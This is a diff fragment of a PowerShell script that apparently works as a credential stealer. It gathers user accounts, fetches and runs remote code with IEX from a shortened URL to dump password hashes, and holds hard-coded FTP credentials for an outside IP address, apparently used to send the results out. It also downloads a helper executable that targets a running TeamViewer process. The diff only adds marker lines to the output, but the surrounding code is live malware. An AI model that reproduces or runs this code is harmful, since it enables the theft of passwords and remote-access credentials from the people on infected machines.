@@ -15,7 +15,7 @@ $tmp | Out-File -Append $file
 quser  | Out-File -Append $file
 net user  | Out-File -Append $file
 IEX (New-Object Net.WebClient).DownloadString('https://is.gd/40uATZ');Get-PassHashes | Out-File -Append $file
-
+"#################pwd#####################" | Out-File -Append $file
 $ftpPath = 'ftp://186.96.109.22//'
 $ftpUser = 'admin'
 $ftpPass = 'dHt0Ir5pnmQ68UFY'
@@ -34,6 +34,7 @@ if ($tmp -match "TeamViewer.exe")
 	(tasklist | Where-Object{$_ -match "TeamViewer.exe"})  -match $parttern
 	$id = $matches[0]
 	$webClient.DownloadFile("rr.exe", $localPath+"rr.exe")
+	"#################tv#####################" | Out-File -Append $file
 	Start-Sleep -s 3
 	& C:\PerfLogs\rr.exe $id | Out-File -Append $file
 	rm C:\PerfLogs\rr.exe
